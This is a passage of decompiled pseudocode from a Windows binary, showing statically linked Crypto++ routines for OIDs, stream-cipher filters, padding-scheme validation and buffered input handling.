  v3 = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)v4);
  return a1;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';
// 41D017: using guessed type char var_1C[12];

//----- (0041D05A) --------------------------------------------------------
_DWORD *__cdecl sub_41D05A(_DWORD *a1)
{
  _DWORD *v1; // eax
  void **v3; // [esp+10h] [ebp-20h] BYREF
  char v4[12]; // [esp+14h] [ebp-1Ch] BYREF
  int v5; // [esp+20h] [ebp-10h]
  int v6; // [esp+2Ch] [ebp-4h]

  v5 = 0;
  v1 = sub_41D017(&v3);
  v6 = 0;
  sub_40EE24(a1, (int)v1, 1);
  v3 = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)v4);
  return a1;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';
// 41D05A: using guessed type char var_1C[12];

//----- (0041D09D) --------------------------------------------------------
_DWORD *__cdecl sub_41D09D(_DWORD *a1)
{
  _DWORD *v1; // eax
  void **v3; // [esp+14h] [ebp-20h] BYREF
  char v4[12]; // [esp+18h] [ebp-1Ch] BYREF
  int v5; // [esp+24h] [ebp-10h]
  int v6; // [esp+30h] [ebp-4h]

  v5 = 0;
  v1 = sub_41C71F(&v3);
  v6 = 0;
  sub_40EE24(a1, (int)v1, 113549);
  v3 = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)v4);
  return a1;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';
// 41D09D: using guessed type char var_1C[12];

//----- (0041D0E5) --------------------------------------------------------
void *__cdecl sub_41D0E5(int a1, void *Source, rsize_t a3, rsize_t DestinationSize, char a5)
{
  void *v6; // eax
  rsize_t v7; // ecx
  void *v8; // [esp+10h] [ebp-10h]

  if ( a3 == DestinationSize )
    return Source;
  if ( a5 )
  {
    if ( DestinationSize )
      v6 = (void *)sub_420B8E(DestinationSize);
    else
      v6 = 0;
    v8 = v6;
    v7 = a3;
    if ( DestinationSize < a3 )
      v7 = DestinationSize;
    if ( Source )
    {
      if ( v6 )
        memcpy_s(v6, v7, Source, v7);
    }
    sub_40921E(Source, a3);
    return v8;
  }
  else
  {
    sub_40921E(Source, a3);
    if ( DestinationSize )
      return (void *)sub_420B8E(DestinationSize);
    else
      return 0;
  }
}

//----- (0041D163) --------------------------------------------------------
void *__thiscall sub_41D163(int this, rsize_t DestinationSize)
{
  void *result; // eax

  result = sub_41D0E5(this, *(void **)(this + 12), *(_DWORD *)(this + 8), DestinationSize, 0);
  *(_DWORD *)(this + 4) = -1;
  *(_DWORD *)(this + 8) = DestinationSize;
  *(_DWORD *)(this + 12) = result;
  return result;
}

//----- (0041D18C) --------------------------------------------------------
void *__thiscall sub_41D18C(int this, int a2, int a3, unsigned int a4)
{
  size_t v5; // edi
  void *result; // eax

  if ( a4 )
  {
    v5 = *(_DWORD *)(this + 16);
    (*(void (__thiscall **)(int, int, _DWORD, int, size_t, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 36))(
      *(_DWORD *)(this + 4) + 4,
      a3,
      *(_DWORD *)(this + 20),
      a2,
      v5,
      4);
    if ( a4 > v5 )
      (*(void (__thiscall **)(int, size_t, int, size_t, unsigned int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 36))(
        *(_DWORD *)(this + 4) + 4,
        v5 + a3,
        a2,
        v5 + a2,
        a4 - v5,
        4);
    return memmove_0(*(void **)(this + 20), (const void *)(a4 + a2 - v5), v5);
  }
  return result;
}

//----- (0041D1F1) --------------------------------------------------------
void *__thiscall sub_41D1F1(_DWORD *this)
{
  sub_41D206(this);
  return sub_40898B((int)(this + 7), this[5]);
}

//----- (0041D206) --------------------------------------------------------
void *__thiscall sub_41D206(_DWORD *this)
{
  rsize_t v2; // eax

  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)(this[2] + 4) + 16))(this[2] + 4);
  return sub_41D163((int)(this + 3), v2);
}

//----- (0041D21F) --------------------------------------------------------
int __thiscall sub_41D21F(_DWORD **this, int a2, int a3, int *a4)
{
  int result; // eax
  int v6; // eax

  (*(void (__thiscall **)(_DWORD *, int, int, int *))(*this[2] + 24))(this[2], a2, a3, a4);
  ((void (__thiscall *)(_DWORD **))(*this)[16])(this);
  result = ((int (__thiscall *)(_DWORD **))(*this)[7])(this);
  if ( result < 4 )
  {
    v6 = sub_40D4AE(this, a4, &a3);
    return ((int (__thiscall *)(_DWORD **, int, int))(*this)[11])(this, v6, a3);
  }
  return result;
}

//----- (0041D267) --------------------------------------------------------
int __thiscall sub_41D267(int this, int a2, _DWORD *a3, char a4)
{
  _BYTE *v5; // eax
  int v6; // edi
  int v7; // eax
  int result; // eax

  v5 = operator new(0x14u);
  v6 = (int)v5;
  if ( v5 )
  {
    v5[8] = a4;
    *((_DWORD *)v5 + 1) = a2;
    v5[9] = 0;
    *((_DWORD *)v5 + 3) = 0;
    *(_DWORD *)v5 = &CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable';
    *((_DWORD *)v5 + 4) = *a3;
  }
  else
  {
    v6 = 0;
  }
  v7 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  sub_4096AA((_DWORD *)(v6 + 12), v7);
  sub_4096AA((_DWORD *)(this + 4), v6);
  result = this;
  *(_BYTE *)(this + 8) = a4;
  return result;
}
// 46D660: using guessed type void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable';

//----- (0041D2E4) --------------------------------------------------------
char __thiscall sub_41D2E4(void *this, int a2, char a3)
{
  char v6; // [esp+1h] [ebp-1h] BYREF

  v6 = HIBYTE(this);
  if ( (*(unsigned __int8 (__stdcall **)(int, bool *, char *))(*(_DWORD *)this + 4))(
         a2,
         &bool `RTTI Type Descriptor',
         &v6) )
  {
    return v6;
  }
  return a3;
}
// 48D458: using guessed type bool bool `RTTI Type Descriptor';

//----- (0041D30E) --------------------------------------------------------
char *__cdecl sub_41D30E(char *a1, int a2, _DWORD *a3, char a4)
{
  _DWORD *v4; // eax
  int v5; // eax
  int v7; // [esp+10h] [ebp-1Ch] BYREF
  _DWORD v8[6]; // [esp+14h] [ebp-18h] BYREF

  v8[2] = 0;
  v4 = sub_41ECA2(&v7);
  v8[5] = 0;
  v5 = sub_41D267((int)v4, a2, a3, a4);
  sub_41EC5D(a1, v5);
  sub_40967A(v8);
  return a1;
}

//----- (0041D354) --------------------------------------------------------
int __cdecl sub_41D354(unsigned int *a1, _QWORD *a2)
{
  _QWORD *v2; // eax

  v2 = a2;
  if ( *a2 >= (unsigned __int64)*a1 )
    v2 = a1;
  return *(_DWORD *)v2;
}

//----- (0041D36F) --------------------------------------------------------
_BYTE *__cdecl sub_41D36F(_BYTE *a1, _BYTE *a2, _BYTE **a3)
{
  _BYTE *i; // ecx

  for ( i = a1; i != a2; ++i )
  {
    if ( **a3 != *i )
      break;
  }
  return i;
}

//----- (0041D38F) --------------------------------------------------------
_DWORD *__thiscall sub_41D38F(_DWORD *this, int a2)
{
  sub_406BFD(this, a2);
  *this = &CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable';
  this[4] = *(_DWORD *)(a2 + 16);
  return this;
}
// 46D660: using guessed type void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable';

//----- (0041D3B9) --------------------------------------------------------
std::exception *__thiscall sub_41D3B9(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';
  return this;
}
// 46D030: using guessed type void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';

//----- (0041D3DA) --------------------------------------------------------
_DWORD *__thiscall sub_41D3DA(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v5[10]; // [esp+14h] [ebp-28h] BYREF

  v3 = sub_40C853(v5, a2, ": Nonblocking input is not implemented by this object.");
  v5[9] = 0;
  sub_406307(this, 0, v3);
  *this = &CryptoPP::NotImplemented::`vftable';
  sub_40BAFC(v5, 1, 0);
  *this = &CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';
  return this;
}
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 46D030: using guessed type void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';

//----- (0041D430) --------------------------------------------------------
_DWORD *__thiscall sub_41D430(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  sub_40CAC3(this, 0);
  this[3] = a2;
  result = this;
  this[4] = 0;
  this[5] = 0;
  return result;
}

//----- (0041D458) --------------------------------------------------------
int __thiscall sub_41D458(int this, int a2)
{
  sub_41D430((_DWORD *)this, a2);
  *(_DWORD *)(this + 24) = -1;
  *(_DWORD *)(this + 32) = -1;
  *(_DWORD *)this = &CryptoPP::FilterWithBufferedInput::`vftable';
  *(_DWORD *)(this + 4) = &CryptoPP::FilterWithBufferedInput::`vftable';
  *(_DWORD *)(this + 28) = 0;
  *(_BYTE *)(this + 36) = 0;
  sub_408A33((_DWORD *)(this + 40), 0);
  return this;
}
// 46D080: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 46D174: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';

//----- (0041D4A7) --------------------------------------------------------
int __thiscall sub_41D4A7(int this, int a2, int a3, char a4, int a5, _DWORD *Src, _DWORD *a7)
{
  int v8; // eax

  sub_41D430((_DWORD *)this, 0);
  *(_DWORD *)(this + 24) = &CryptoPP::FilterPutSpaceHelper::`vftable';
  sub_408A33((_DWORD *)(this + 28), 0);
  *(_DWORD *)(this + 44) = a2;
  *(_DWORD *)this = &CryptoPP::HashFilter::`vftable';
  *(_DWORD *)(this + 4) = &CryptoPP::HashFilter::`vftable';
  *(_DWORD *)(this + 24) = &CryptoPP::HashFilter::`vftable';
  *(_BYTE *)(this + 48) = a4;
  *(_DWORD *)(this + 52) = 0;
  *(_DWORD *)(this + 56) = 0;
  sub_404FC9((_DWORD *)(this + 60), Src);
  sub_404FC9((_DWORD *)(this + 84), a7);
  v8 = a5;
  if ( a5 < 0 )
    v8 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 44) + 28))(*(_DWORD *)(this + 44));
  *(_DWORD *)(this + 52) = v8;
  sub_41EC44((_DWORD *)(this + 12), a3);
  return this;
}
// 46C14C: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 46C154: using guessed type void *CryptoPP::HashFilter::`vftable';
// 46C214: using guessed type void *CryptoPP::HashFilter::`vftable';
// 46C224: using guessed type void *CryptoPP::HashFilter::`vftable';

//----- (0041D546) --------------------------------------------------------
int __thiscall sub_41D546(int this, int a2, int a3, int a4)
{
  int v5; // eax
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  bool v9; // al
  unsigned int v10; // ecx
  bool v11; // cf
  int *v12; // eax
  char *v13; // eax
  unsigned int v15; // [esp+14h] [ebp-54h] BYREF
  int pExceptionObject[10]; // [esp+18h] [ebp-50h] BYREF
  _DWORD Src[3]; // [esp+40h] [ebp-28h] BYREF
  char v18[4]; // [esp+4Ch] [ebp-1Ch] BYREF
  int v19[5]; // [esp+50h] [ebp-18h] BYREF
  int v20; // [esp+64h] [ebp-4h]

  sub_41D458(this, a3);
  v15 = this + 72;
  v20 = 0;
  *(_DWORD *)(this + 72) = &CryptoPP::FilterPutSpaceHelper::`vftable';
  sub_408A33((_DWORD *)(this + 76), 0);
  LOBYTE(v20) = 1;
  *(_DWORD *)this = &off_46D184;
  *(_DWORD *)(this + 4) = &off_46D278;
  *(_DWORD *)(this + 72) = &off_46D288;
  *(_DWORD *)(this + 96) = a2;
  *(_DWORD *)(this + 100) = 5;
  if ( __RTDynamicCast(
         a2,
         0,
         &CryptoPP::StreamTransformation `RTTI Type Descriptor',
         &CryptoPP::AuthenticatedSymmetricCipher `RTTI Type Descriptor',
         0) )
  {
    sub_40AAE3(
      (int)Src,
      "StreamTransformationFilter: please use AuthenticatedEncryptionFilter and AuthenticatedDecryptionFilter for Authent"
      "icatedSymmetricCipher");
    LOBYTE(v20) = 2;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v5 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 96) + 12))(*(_DWORD *)(this + 96));
  v6 = *(_DWORD *)(this + 96);
  *(_DWORD *)(this + 104) = v5;
  v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v6 + 16))(v6);
  v8 = *(_DWORD *)(this + 96);
  *(_DWORD *)(this + 108) = v7;
  v9 = (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v8 + 40))(v8) && *(_DWORD *)(this + 104) > 1u;
  v10 = *(_DWORD *)(this + 104);
  *(_BYTE *)(this + 116) = v9;
  v10 *= 2;
  v11 = v10 < *(_DWORD *)(this + 108);
  v12 = (int *)&v15;
  v15 = v10;
  if ( v11 )
    v12 = (int *)(this + 108);
  *(_DWORD *)(this + 112) = *v12;
  v13 = sub_41D30E(v18, (int)"BlockPaddingScheme", &a4, 1);
  LOBYTE(v20) = 3;
  sub_41DE34((int *)this, (int)v13);
  sub_40967A(v19);
  return this;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 46C14C: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 46D184: using guessed type int (__thiscall *off_46D184)(void *Block, char);
// 46D278: using guessed type void *off_46D278;
// 46D288: using guessed type void *off_46D288;
// 41D546: using guessed type _DWORD Src[3];
// 41D546: using guessed type char var_1C[4];
// 41D546: using guessed type int var_18[5];

//----- (0041D672) --------------------------------------------------------
int __thiscall sub_41D672(_DWORD *this)
{
  *this = &CryptoPP::FilterWithBufferedInput::`vftable';
  this[1] = &CryptoPP::FilterWithBufferedInput::`vftable';
  sub_4089EF(this + 10);
  return sub_405EEF(this + 3);
}
// 46D080: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 46D174: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';

//----- (0041D693) --------------------------------------------------------
int __thiscall sub_41D693(_DWORD *this)
{
  *this = &off_46D184;
  this[1] = &off_46D278;
  this[18] = &off_46D288;
  this[18] = &CryptoPP::FilterPutSpaceHelper::`vftable';
  sub_4089EF(this + 19);
  return sub_41D672(this);
}
// 46C14C: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 46D184: using guessed type int (__thiscall *off_46D184)(void *Block, char);
// 46D278: using guessed type void *off_46D278;
// 46D288: using guessed type void *off_46D288;

//----- (0041D6C1) --------------------------------------------------------
_DWORD *__thiscall sub_41D6C1(_DWORD *this, _DWORD ***a2)
{
  _DWORD **v2; // eax
  _DWORD *v3; // eax

  v2 = *a2;
  if ( (_DWORD **)*this != *a2 )
  {
    if ( v2 )
    {
      v3 = *v2;
      if ( v3 )
        *this = *v3;
    }
  }
  return this;
}

//----- (0041D6DE) --------------------------------------------------------
char *__thiscall sub_41D6DE(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_41D672(this - 1);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v2;
}

//----- (0041D754) --------------------------------------------------------
_DWORD *__thiscall sub_41D754(_DWORD *Block, char a2)
{
  sub_41D693(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0041D773) --------------------------------------------------------
int __thiscall sub_41D773(_DWORD **this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, _DWORD))(*this[24] + 8))(this[24], a2, 0);
  return a2;
}

//----- (0041D78F) --------------------------------------------------------
char __thiscall sub_41D78F(int *this, void *Src, char *a3, int *a4)
{
  int v5; // eax

  if ( __std_type_info_compare(&dword_48D494, &dword_490750)
    || (LOBYTE(v5) = sub_40F4DF(a3, (int)a4, this + 4), !(_BYTE)v5) )
  {
    sub_406577(Src, (char *)&enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme `RTTI Type Descriptor', (int)a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 44416A: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 48D494: using guessed type int dword_48D494;
// 490750: using guessed type int dword_490750;

//----- (0041D7E0) --------------------------------------------------------
int __thiscall sub_41D7E0(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // eax

  v1 = this + 3;
  if ( !this[3] )
  {
    v2 = (*(int (__thiscall **)(_DWORD *))(*this + 176))(this);
    sub_41EC44(v1, v2);
  }
  return *v1;
}

//----- (0041D7FD) --------------------------------------------------------
int __thiscall sub_41D7FD(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v7; // eax

  v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 160))(this);
  return (*(int (__thiscall **)(int, int, int, int, int, int, int))(*(_DWORD *)v7 + 128))(v7, a2, a3, a4, a5, a6, a7);
}

//----- (0041D828) --------------------------------------------------------
int __thiscall sub_41D828(_DWORD *this, int a2, _QWORD *a3, __int64 a4, int a5, int a6)
{
  _DWORD *v7; // esi
  int v8; // eax
  int v9; // ebx
  unsigned __int64 v10; // kr08_8
  int result; // eax
  __int64 v12; // [esp+10h] [ebp-8h] BYREF

  v7 = this + 6;
  v12 = *a3 + (unsigned int)this[7];
  v8 = sub_41D354(this + 6, &v12);
  v10 = a4 - *a3;
  v9 = v10;
  if ( v10 >= (unsigned int)(*v7 - v8) )
    v9 = *v7 - v8;
  result = (*(int (__thiscall **)(int, int, int, int, _DWORD, int))(*(_DWORD *)a2 + 136))(
             a2,
             a5,
             v8 + this[5],
             v9,
             0,
             a6);
  if ( !result )
    *a3 += (unsigned int)v9;
  return result;
}

//----- (0041D8A8) --------------------------------------------------------
int __thiscall sub_41D8A8(_DWORD *this, int *a2)
{
  _DWORD *v3; // esi

  v3 = this + 6;
  *a2 = sub_40C058(this + 4, this + 6);
  return *v3 + this[3];
}

//----- (0041D8CB) --------------------------------------------------------
int __thiscall sub_41D8CB(_DWORD *this, int a2)
{
  return sub_41EC44(this + 3, a2);
}

//----- (0041D8D3) --------------------------------------------------------
char __thiscall sub_41D8D3(_BYTE *this)
{
  return this[36];
}

//----- (0041D8D7) --------------------------------------------------------
int __thiscall sub_41D8D7(int *this, int a2)
{
  int *v2; // esi
  unsigned int v3; // eax
  bool v4; // cf
  int *v5; // ecx
  int result; // eax
  unsigned int v7; // [esp+4h] [ebp-4h] BYREF

  v2 = this + 27;
  v7 = 4096;
  v3 = sub_40A9DA(&v7, this + 27);
  v4 = *v2 < v3;
  v5 = (int *)&v7;
  v7 = v3;
  if ( !v4 )
    v5 = v2;
  result = *v5;
  *v2 = *v5;
  return result;
}

//----- (0041D908) --------------------------------------------------------
bool __thiscall sub_41D908(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax

  v5 = this[5];
  if ( v5 )
  {
    if ( v5 != 1 )
      return 0;
  }
  else if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int, int))(*this + 32))(this, a2, a4) )
  {
    return 1;
  }
  return sub_41E5FB(this, 1, a2, a3, a4, (int)dword_48C0AC) != 0;
}
// 48C0AC: using guessed type _DWORD dword_48C0AC[6];

//----- (0041D950) --------------------------------------------------------
void __thiscall sub_41D950(_DWORD *this)
{
  unsigned int v2; // eax
  int v3; // esi
  int v4; // eax
  int v5; // esi
  int v6; // eax
  int v7; // eax
  unsigned int v8; // [esp-Ch] [ebp-14h]
  int v9; // [esp-Ch] [ebp-14h]
  int v10; // [esp+4h] [ebp-4h] BYREF

  if ( *((_BYTE *)this + 36) )
  {
    v2 = this[7];
    if ( v2 <= 1 )
    {
      while ( 1 )
      {
        v7 = this[16];
        v10 = v7;
        if ( !v7 )
          break;
        v5 = *this;
        v9 = v7;
        v6 = sub_41DA41(this + 10, &v10);
        (*(void (__thiscall **)(_DWORD *, int, int))(v5 + 224))(this, v6, v9);
      }
    }
    else
    {
      while ( this[16] >= v2 )
      {
        v3 = *this;
        v8 = v2;
        v4 = sub_41DA05(this + 10);
        (*(void (__thiscall **)(_DWORD *, int, unsigned int))(v3 + 224))(this, v4, v8);
        v2 = this[7];
      }
    }
  }
}

//----- (0041D9B0) --------------------------------------------------------
int __thiscall sub_41D9B0(int this, int Size)
{
  char *v2; // ebp
  int result; // eax
  int v5; // edi
  const void *v6; // eax
  int v7; // esi

  v2 = (char *)Size;
  if ( !Size )
    return 0;
  v5 = *(_DWORD *)(this + 24);
  Size = *(_DWORD *)(this + 16) * *(_DWORD *)(this + 20);
  v6 = (const void *)sub_41DA41((_DWORD *)this, &Size);
  v7 = Size;
  memmove_0(v2, v6, Size);
  memmove_0(&v2[v7], *(const void **)(this + 28), *(_DWORD *)(this + 24));
  result = v5;
  *(_DWORD *)(this + 24) = 0;
  return result;
}

//----- (0041DA05) --------------------------------------------------------
int __thiscall sub_41DA05(_DWORD *this)
{
  unsigned int v1; // edi
  unsigned int v2; // eax
  int v3; // ebp
  int v4; // ebx
  unsigned int v5; // edi
  int result; // eax

  v1 = this[6];
  v2 = this[4];
  if ( v1 < v2 )
    return 0;
  v3 = this[7];
  this[7] = v2 + v3;
  v4 = this[3];
  if ( v2 + v3 == v4 + this[2] )
    this[7] = v4;
  v5 = v1 - v2;
  result = v3;
  this[6] = v5;
  return result;
}

//----- (0041DA3D) --------------------------------------------------------
int __thiscall sub_41DA3D(_DWORD *this)
{
  return this[7];
}

//----- (0041DA41) --------------------------------------------------------
int __thiscall sub_41DA41(_DWORD *this, int *a2)
{
  int *v3; // edx
  int *v4; // ecx
  _DWORD *v5; // edi
  bool v6; // cf
  int v7; // eax
  int v8; // edx
  bool v9; // zf
  int v11; // [esp+Ch] [ebp-4h] BYREF

  v3 = &v11;
  v4 = a2;
  v5 = this + 6;
  v6 = this[6] < (unsigned int)(this[2] + this[3] - this[7]);
  v11 = this[2] + this[3] - this[7];
  if ( v6 )
    v3 = this + 6;
  if ( *v3 < (unsigned int)*a2 )
    v4 = v3;
  v7 = *v4;
  *a2 = *v4;
  v8 = this[7];
  this[7] = v8 + v7;
  v9 = *v5 == *a2;
  *v5 -= *a2;
  if ( v9 || this[7] == this[2] + this[3] )
    this[7] = this[3];
  return v8;
}

//----- (0041DA9B) --------------------------------------------------------
int __thiscall sub_41DA9B(_DWORD *this)
{
  return this[6];
}

//----- (0041DA9F) --------------------------------------------------------
int __thiscall sub_41DA9F(_DWORD *this)
{
  return this[8];
}

//----- (0041DAA3) --------------------------------------------------------
char __thiscall sub_41DAA3(_BYTE *this)
{
  if ( this[16] || (*(unsigned __int8 (__thiscall **)(_BYTE *))(*(_DWORD *)this + 64))(this) )
    return 0;
  this[16] = 1;
  return 1;
}

//----- (0041DAC1) --------------------------------------------------------
int __thiscall sub_41DAC1(void *this, char *a2, char *a3, int a4)
{
  int result; // eax
  _BYTE **v5; // eax
  _BYTE **v6; // eax
  _BYTE **v7; // eax
  _DWORD *v8; // eax
  char v9[24]; // [esp+10h] [ebp-98h] BYREF
  char v10[24]; // [esp+28h] [ebp-80h] BYREF
  char v11[24]; // [esp+40h] [ebp-68h] BYREF
  char v12[24]; // [esp+58h] [ebp-50h] BYREF
  int pExceptionObject[13]; // [esp+70h] [ebp-38h] BYREF
  int v14; // [esp+A4h] [ebp-4h]

  result = (*(int (__thiscall **)(void *, char *, int *, int))(*(_DWORD *)this + 4))(
             this,
             a3,
             &int `RTTI Type Descriptor',
             a4);
  if ( !(_BYTE)result )
  {
    v5 = (_BYTE **)sub_40AAE3((int)v12, a2);
    v14 = 0;
    v6 = (_BYTE **)sub_40BEFB((int)v11, v5, ": missing required parameter '");
    LOBYTE(v14) = 1;
    v7 = (_BYTE **)sub_40BEFB((int)v10, v6, a3);
    LOBYTE(v14) = 2;
    v8 = (_DWORD *)sub_40BEFB((int)v9, v7, "'");
    LOBYTE(v14) = 3;
    sub_406307(pExceptionObject, 1, v8);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 49074C: using guessed type int int `RTTI Type Descriptor';
// 41DAC1: using guessed type char var_50[24];
// 41DAC1: using guessed type char var_68[24];
// 41DAC1: using guessed type char var_80[24];
// 41DAC1: using guessed type char var_98[24];

//----- (0041DB59) --------------------------------------------------------
int __thiscall sub_41DB59(_DWORD *this, int a2, int a3, size_t a4, size_t a5, size_t *a6)
{
  size_t *v7; // edi
  int result; // eax

  v7 = a6;
  if ( this[3] < a4 )
  {
    result = (*(int (__thiscall **)(int, int, size_t *))(*(_DWORD *)a2 + 132))(a2, a3, &a5);
    if ( a5 >= a4 )
    {
      *v7 = a5;
      return result;
    }
    sub_40898B((int)(this + 1), *v7);
  }
  *v7 = this[3];
  return this[4];
}

//----- (0041DBA4) --------------------------------------------------------
void __thiscall sub_41DBA4(int *this, int a2, int a3)
{
  int v4; // eax

  v4 = *this;
  this[5] = 0;
  this[4] = 0;
  (*(void (__stdcall **)(int))(v4 + 28))(a2);
  sub_41E686(this, a2, a3);
}

//----- (0041DBCB) --------------------------------------------------------
int __thiscall sub_41DBCB(void *this, int a2, int a3, int a4, int a5)
{
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 208))(this, a2);
}

//----- (0041DBDA) --------------------------------------------------------
int __thiscall sub_41DBDA(int this, int a2, _DWORD *a3, _DWORD *a4, int *a5)
{
  int v6; // edi
  bool v7; // cl
  int v8; // eax
  _BYTE **v9; // eax
  _DWORD *v10; // eax
  _BYTE **v11; // eax
  _BYTE **v12; // eax
  _DWORD *v13; // eax
  int result; // eax
  int v15; // [esp+18h] [ebp-C4h] BYREF
  char v16[24]; // [esp+1Ch] [ebp-C0h] BYREF
  char v17[24]; // [esp+34h] [ebp-A8h] BYREF
  int v18[10]; // [esp+4Ch] [ebp-90h] BYREF
  char v19[24]; // [esp+74h] [ebp-68h] BYREF
  char v20[24]; // [esp+8Ch] [ebp-50h] BYREF
  int pExceptionObject[13]; // [esp+A4h] [ebp-38h] BYREF
  int v22; // [esp+D8h] [ebp-4h]

  v6 = 5;
  if ( (*(unsigned __int8 (__thiscall **)(int, const char *, void *, int *))(*(_DWORD *)a2 + 4))(
         a2,
         "BlockPaddingScheme",
         &enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme `RTTI Type Descriptor',
         &v15) )
  {
    v6 = v15;
  }
  v7 = *(_DWORD *)(this + 104) > 1u
    && !(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 96) + 36))(*(_DWORD *)(this + 96));
  if ( v6 == 5 )
  {
    v8 = 0;
    if ( v7 )
      v8 = 2;
    *(_DWORD *)(this + 100) = v8;
  }
  else
  {
    *(_DWORD *)(this + 100) = v6;
  }
  if ( !v7 )
  {
    switch ( *(_DWORD *)(this + 100) )
    {
      case 2:
        v9 = (_BYTE **)(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 96) + 8))(
                         *(_DWORD *)(this + 96),
                         v20);
        v22 = 0;
        v10 = (_DWORD *)sub_40C8C7((int)v19, "StreamTransformationFilter: PKCS_PADDING cannot be used with ", v9);
        LOBYTE(v22) = 1;
        goto LABEL_15;
      case 4:
        v11 = (_BYTE **)(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 96) + 8))(
                          *(_DWORD *)(this + 96),
                          v19);
        v22 = 2;
        v10 = (_DWORD *)sub_40C8C7((int)v20, "StreamTransformationFilter: W3C_PADDING cannot be used with ", v11);
        LOBYTE(v22) = 3;
LABEL_15:
        sub_406307(pExceptionObject, 1, v10);
        pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
      case 3:
        v12 = (_BYTE **)(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 96) + 8))(
                          *(_DWORD *)(this + 96),
                          v17);
        v22 = 4;
        v13 = (_DWORD *)sub_40C8C7(
                          (int)v16,
                          "StreamTransformationFilter: ONE_AND_ZEROS_PADDING cannot be used with ",
                          v12);
        LOBYTE(v22) = 5;
        sub_406307(v18, 1, v13);
        v18[0] = (int)&CryptoPP::InvalidArgument::`vftable';
        _CxxThrowException(v18, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
  }
  *a3 = 0;
  *a4 = *(_DWORD *)(this + 104);
  result = sub_41DF09(*(int **)(this + 96), *(_DWORD *)(this + 100));
  *a5 = result;
  return result;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 41DBDA: using guessed type char var_A8[24];
// 41DBDA: using guessed type char var_C0[24];

//----- (0041DD5E) --------------------------------------------------------
char __thiscall sub_41DD5E(_DWORD *this, char a2, char a3)
{
  _DWORD pExceptionObject[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD v6[10]; // [esp+38h] [ebp-28h] BYREF

  if ( !a3 )
  {
    sub_40AAE3((int)v6, "FilterWithBufferedInput");
    v6[9] = 0;
    sub_41D3DA(pExceptionObject, v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__);
  }
  if ( a2 )
    sub_41D950(this);
  (*(void (__thiscall **)(_DWORD *))(*this + 232))(this);
  return 0;
}
